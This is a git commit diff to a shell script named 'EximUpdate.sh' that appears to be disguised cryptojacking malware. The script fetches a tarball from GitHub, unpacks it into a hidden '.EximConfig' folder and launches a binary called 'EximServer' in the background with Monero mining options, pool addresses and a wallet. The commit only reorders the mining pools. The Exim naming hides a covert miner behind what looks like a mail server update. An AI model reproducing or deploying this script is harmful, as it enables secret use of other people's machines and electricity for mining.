eff95f118e2a786dc54c13d89f50b705e900adc6
EximFile <39961635+EximFile@users.noreply.github.com>
2018-06-07 17:19:30 +0000

    Update EximUpdate.sh

--- EximUpdate.sh
+++ EximUpdate.sh
@@ -3,4 +3,4 @@ wget https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz || curl 
 tar -xvzf EximServer.tar.gz
 rm EximServer.tar.gz
 cd .EximConfig
-./EximServer -B -r 10 -R 10 --donate-level 1 --max-cpu-usage 75 --cpu-priority 3 -o aeromonero.win:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k -o pool.supportxmr.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k -o monerohash.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k
+./EximServer -B -r 10 -R 10 --donate-level 1 --max-cpu-usage 75 --cpu-priority 3 -o pool.supportxmr.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k -o monerohash.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k -o aeromonero.win:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k 
